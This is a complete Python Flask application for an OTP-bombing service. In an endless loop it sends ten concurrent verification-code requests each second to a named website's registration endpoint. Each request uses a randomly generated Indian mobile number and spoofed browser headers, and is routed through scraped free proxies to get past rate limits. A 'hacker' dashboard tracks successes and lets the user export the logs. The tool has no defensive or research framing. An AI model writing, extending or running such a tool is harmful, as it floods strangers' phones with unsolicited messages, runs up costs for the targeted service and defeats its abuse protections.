import asyncio
import aiohttp
import random
import time
import threading
import json
from flask import Flask, jsonify, render_template_string, Response

app = Flask(__name__)

# --- GLOBAL STATE ---
STATE = {
    "start_time": time.time(),
    "code_200": 0,
    "code_400": 0,
    "proxies_tried": 0,
    "working_proxies": 0,
    "logs": []
}

PROXY_LIST = set()
WORKING_PROXIES = set()

# --- ASYNC BACKGROUND TASKS ---
async def fetch_proxies(session):
    """Fetch free HTTP proxies from ProxyScrape."""
    try:
        url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all"
        async with session.get(url) as resp:
            text = await resp.text()
            proxies = text.strip().split('\r\n')
            for p in proxies:
                if p:
                    PROXY_LIST.add(p)
    except Exception as e:
        print(f"Proxy fetch error: {e}")

async def attempt_otp(session):
    """Generate random number, pick a proxy, and send OTP."""
    global PROXY_LIST, WORKING_PROXIES
    
    if not PROXY_LIST and not WORKING_PROXIES:
        await fetch_proxies(session)
        if not PROXY_LIST:
            await asyncio.sleep(5)
            return

    # 30% chance to reuse a known working proxy, 70% chance to test a new one
    if WORKING_PROXIES and random.random() > 0.7:
        proxy = random.choice(list(WORKING_PROXIES))
    else:
        if PROXY_LIST:
            proxy = PROXY_LIST.pop()
        else:
            return

    STATE["proxies_tried"] += 1
    
    # Generate random 10-digit Indian mobile number
    mobile = "+91" + random.choice("6789") + "".join(random.choices("0123456789", k=9))
    payload = {"mobile_number": mobile, "verify_type": "register"}
    headers = {
        "Origin": "https://cooe03.in",
        "Referer": "https://cooe03.in/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "application/json, text/plain, */*"
    }

    log_entry = {
        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
        "mobile": mobile,
        "proxy": proxy,
        "status": "Failed"
    }

    try:
        # Route through proxy
        proxy_url = f"http://{proxy}"
        async with session.post("https://cooe03.in/user/send_verify_code", json=payload, headers=headers, proxy=proxy_url, timeout=10) as resp:
            try:
                data = await resp.json()
                code = data.get("code", resp.status)
                log_entry["status"] = code
                
                if code == 200:
                    STATE["code_200"] += 1
                    WORKING_PROXIES.add(proxy)
                elif code == 400:
                    STATE["code_400"] += 1
                    if proxy in WORKING_PROXIES:
                        WORKING_PROXIES.remove(proxy)
                else:
                    if proxy in WORKING_PROXIES:
                        WORKING_PROXIES.remove(proxy)
            except:
                log_entry["status"] = "Bad Response"
                if proxy in WORKING_PROXIES:
                    WORKING_PROXIES.remove(proxy)
    except Exception as e:
        log_entry["status"] = "Timeout/Dead"
        if proxy in WORKING_PROXIES:
            WORKING_PROXIES.remove(proxy)

    STATE["working_proxies"] = len(WORKING_PROXIES)
    STATE["logs"].insert(0, log_entry)
    
    # Cap logs in memory to 10,000 to prevent RAM overflow on free tier
    if len(STATE["logs"]) > 10000:
        STATE["logs"] = STATE["logs"][:10000]

async def otp_loop():
    """Run 10 concurrent tasks indefinitely."""
    async with aiohttp.ClientSession() as session:
        while True:
            # Simultaneously execute 10 OTP requests
            tasks = [attempt_otp(session) for _ in range(10)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(1) # Prevent CPU pegging

def start_background_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

# --- FLASK ROUTES ---
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/stats')
def stats():
    # Calculate uptime
    uptime_seconds = int(time.time() - STATE["start_time"])
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{hours:02d}h {minutes:02d}m {seconds:02d}s"
    
    return jsonify({
        "uptime": uptime_str,
        "code_200": STATE["code_200"],
        "code_400": STATE["code_400"],
        "proxies_tried": STATE["proxies_tried"],
        "working_proxies": STATE["working_proxies"],
        # Send only the latest 50 logs to the UI for performance
        "logs": STATE["logs"][:50] 
    })

@app.route('/api/export')
def export_data():
    """Export all stored logs as JSON."""
    def generate():
        yield json.dumps(STATE["logs"], indent=4)
    return Response(generate(), mimetype='application/json', headers={'Content-Disposition': 'attachment;filename=otp_bomb_data.json'})

# --- UI TEMPLATE (Hacker Vibe) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYS.TERMINAL // OTP ROUTER</title>
    <style>
        body {
            background-color: #050505;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 20px;
        }
        h1 {
            text-align: center;
            text-shadow: 0 0 10px #00ff00;
            border-bottom: 1px solid #00ff00;
            padding-bottom: 10px;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }
        .stat-box {
            border: 1px solid #00ff00;
            padding: 15px;
            text-align: center;
            background: rgba(0, 255, 0, 0.05);
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
        }
        .stat-value {
            font-size: 24px;
            font-weight: bold;
            margin-top: 10px;
            text-shadow: 0 0 5px #00ff00;
        }
        .table-container {
            margin-top: 30px;
            max-height: 500px;
            overflow-y: auto;
            border: 1px solid #00ff00;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #004400;
        }
        th {
            background: #002200;
            position: sticky;
            top: 0;
        }
        .btn-export {
            display: block;
            width: 100%;
            padding: 15px;
            background: #002200;
            color: #00ff00;
            border: 1px solid #00ff00;
            font-family: 'Courier New', Courier, monospace;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
            text-align: center;
            text-decoration: none;
            transition: 0.3s;
        }
        .btn-export:hover {
            background: #00ff00;
            color: #000;
            box-shadow: 0 0 15px #00ff00;
        }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #050505; border-left: 1px solid #00ff00; }
        ::-webkit-scrollbar-thumb { background: #00ff00; }
    </style>
</head>
<body>

    <h1>[ SYS.TERMINAL // GLOBAL PROXY ROUTING ]</h1>

    <div class="stats-grid">
        <div class="stat-box">
            <div>SERVER UPTIME</div>
            <div class="stat-value" id="val_uptime">00h 00m 00s</div>
        </div>
        <div class="stat-box">
            <div>CODE 200 (SUCCESS)</div>
            <div class="stat-value" id="val_200">0</div>
        </div>
        <div class="stat-box" style="color: #ff3333; border-color: #ff3333;">
            <div style="color: #ff3333;">CODE 400 (LIMIT)</div>
            <div class="stat-value" id="val_400" style="text-shadow: 0 0 5px #ff3333;">0</div>
        </div>
        <div class="stat-box">
            <div>PROXIES TRIED</div>
            <div class="stat-value" id="val_tried">0</div>
        </div>
        <div class="stat-box">
            <div>WORKING PROXIES</div>
            <div class="stat-value" id="val_working">0</div>
        </div>
    </div>

    <a href="/api/export" target="_blank" class="btn-export">>> EXPORT ALL TRAFFIC DATA (.JSON) <<</a>

    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th>TIMESTAMP</th>
                    <th>TARGET NUMBER</th>
                    <th>ROUTED PROXY</th>
                    <th>RESPONSE CODE</th>
                </tr>
            </thead>
            <tbody id="log_body">
                <!-- Logs injected here via JS -->
            </tbody>
        </table>
    </div>

    <script>
        function fetchStats() {
            fetch('/api/stats')
                .then(res => res.json())
                .then(data => {
                    document.getElementById('val_uptime').innerText = data.uptime;
                    document.getElementById('val_200').innerText = data.code_200;
                    document.getElementById('val_400').innerText = data.code_400;
                    document.getElementById('val_tried').innerText = data.proxies_tried;
                    document.getElementById('val_working').innerText = data.working_proxies;

                    const tbody = document.getElementById('log_body');
                    tbody.innerHTML = '';
                    data.logs.forEach(log => {
                        let color = '#00ff00'; // Default Green
                        if (log.status === 400) color = '#ff3333'; // Red
                        else if (log.status === 'Timeout/Dead' || log.status === 'Bad Response') color = '#555555'; // Gray
                        
                        const tr = document.createElement('tr');
                        tr.style.color = color;
                        tr.innerHTML = `
                            <td>${log.time}</td>
                            <td>${log.mobile}</td>
                            <td>${log.proxy}</td>
                            <td>[ ${log.status} ]</td>
                        `;
                        tbody.appendChild(tr);
                    });
                })
                .catch(err => console.error("Sync Error:", err));
        }

        // Update stats every 1 second
        setInterval(fetchStats, 1000);
        fetchStats();
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    import os
    
    # 1. Start Async Loop in Background Thread
    loop = asyncio.new_event_loop()
    t = threading.Thread(target=start_background_loop, args=(loop,), daemon=True)
    t.start()
    asyncio.run_coroutine_threadsafe(otp_loop(), loop)

    # 2. Start Flask Server (Render dynamically assigns a PORT)
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
